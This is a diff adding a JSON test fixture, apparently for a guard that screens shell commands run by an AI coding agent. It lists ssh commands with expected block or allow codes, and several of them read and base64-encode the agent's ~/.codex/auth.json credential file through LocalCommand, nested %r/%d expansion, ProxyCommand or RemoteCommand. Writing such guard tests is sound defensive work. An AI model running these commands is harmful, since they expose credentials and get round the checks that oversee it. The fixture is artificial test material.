@@ -1,0 +1,68 @@
+{
+  "fixture_files": {
+    "protected-reader.sh": "#!/usr/bin/env bash\ncat \"$HOME/.codex/auth.json\" | base64\n",
+    "neutral-reader.sh": "#!/usr/bin/env bash\ncat \"$HOME/.codex/artifacts/research/notes.md\" | base64\n"
+  },
+  "cases": [
+    {
+      "id": "ssh-quoted-permission-yes-reader-protected",
+      "family": "ssh-scalar-configuration",
+      "expected": 2,
+      "command": "ssh -o 'PermitLocalCommand=\"yes\"' -o \"LocalCommand=bash {root}/protected-reader.sh\" example.invalid"
+    },
+    {
+      "id": "ssh-quoted-permission-yes-reader-neutral",
+      "family": "ssh-scalar-configuration",
+      "expected": 0,
+      "command": "ssh -o 'PermitLocalCommand=\"yes\"' -o \"LocalCommand=bash {root}/neutral-reader.sh\" example.invalid"
+    },
+    {
+      "id": "ssh-quoted-permission-no-inert-source",
+      "family": "ssh-scalar-configuration",
+      "expected": 0,
+      "command": "ssh -o 'PermitLocalCommand=\"no\"' -o \"LocalCommand=cat {root}/.codex/auth.json | base64\" example.invalid"
+    },
+    {
+      "id": "ssh-nested-token-becomes-active",
+      "family": "ssh-expansion-layers",
+      "expected": 2,
+      "command": "ssh -o PermitLocalCommand=yes -o \"LocalCommand=ssh -l auth.json -o PermitLocalCommand=yes -o 'LocalCommand=cat %%d/.codex/%%r | base64' inner.example.invalid\" outer.example.invalid"
+    },
+    {
+      "id": "ssh-nested-token-neutral-artifact",
+      "family": "ssh-expansion-layers",
+      "expected": 0,
+      "command": "ssh -o PermitLocalCommand=yes -o \"LocalCommand=ssh -l auth.json -o PermitLocalCommand=yes -o 'LocalCommand=cat %%d/.codex/artifacts/research/notes.md | base64' inner.example.invalid\" outer.example.invalid"
+    },
+    {
+      "id": "ssh-nested-percent-remains-literal",
+      "family": "ssh-expansion-layers",
+      "expected": 0,
+      "command": "ssh -o PermitLocalCommand=yes -o \"LocalCommand=ssh -l auth.json -o PermitLocalCommand=yes -o 'LocalCommand=cat %%%%d/.codex/%%%%r | base64' inner.example.invalid\" outer.example.invalid"
+    },
+    {
+      "id": "ssh-proxy-token-affected-target",
+      "family": "existing-ssh-setting-expansion",
+      "expected": 2,
+      "command": "ssh -l auth.json -o 'ProxyCommand=cat ~/.codex/%r | base64' example.invalid"
+    },
+    {
+      "id": "ssh-proxy-token-neutral-artifact",
+      "family": "existing-ssh-setting-expansion",
+      "expected": 0,
+      "command": "ssh -l auth.json -o 'ProxyCommand=cat ~/.codex/artifacts/research/notes.md | base64' example.invalid"
+    },
+    {
+      "id": "ssh-remote-token-affected-target",
+      "family": "existing-ssh-setting-expansion",
+      "expected": 2,
+      "command": "ssh -l auth.json -o 'RemoteCommand=cat ~/.codex/%r | base64' example.invalid"
+    },
+    {
+      "id": "ssh-remote-token-neutral-artifact",
+      "family": "existing-ssh-setting-expansion",
+      "expected": 0,
+      "command": "ssh -l auth.json -o 'RemoteCommand=cat ~/.codex/artifacts/research/notes.md | base64' example.invalid"
+    }
+  ]
+}
